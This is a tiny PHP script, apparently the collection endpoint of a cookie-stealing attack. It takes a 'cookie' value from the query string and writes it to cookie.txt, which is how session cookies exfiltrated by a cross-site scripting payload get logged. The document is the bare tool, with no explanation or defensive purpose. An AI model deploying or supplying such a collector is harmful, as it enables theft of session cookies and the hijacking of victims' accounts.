<?php
echo 123;
if (!empty($_GET['cookie'])) {
    file_put_contents('cookie.txt',$_GET['cookie']);
}

